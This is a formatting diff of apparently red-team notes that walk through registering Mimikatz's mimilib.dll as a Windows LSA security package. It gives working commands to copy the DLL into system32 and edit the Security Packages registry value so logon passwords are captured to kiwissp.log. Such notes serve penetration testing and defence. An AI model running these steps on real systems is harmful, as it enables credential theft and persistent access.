@@ -10,38 +10,32 @@ This technique abuses Windows Authentication Packages and injects a DLL into the
 
 Copying the evil DLL:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```cpp
 PS C:\> copy mimilib.dll %systemroot%\system32
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Check which LSA Security Packages are already on the list:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```bash
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
     Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Add mimilb to the Security Support Providers:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
 Value Security Packages exists, overwrite(Yes/No)? y
 The operation completed successfully.
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 The below shows the screens of the Security Packages registry value with the **mimilib** injected and the kiwissp.log file with a redacted password that had been logged during the user logon:
 
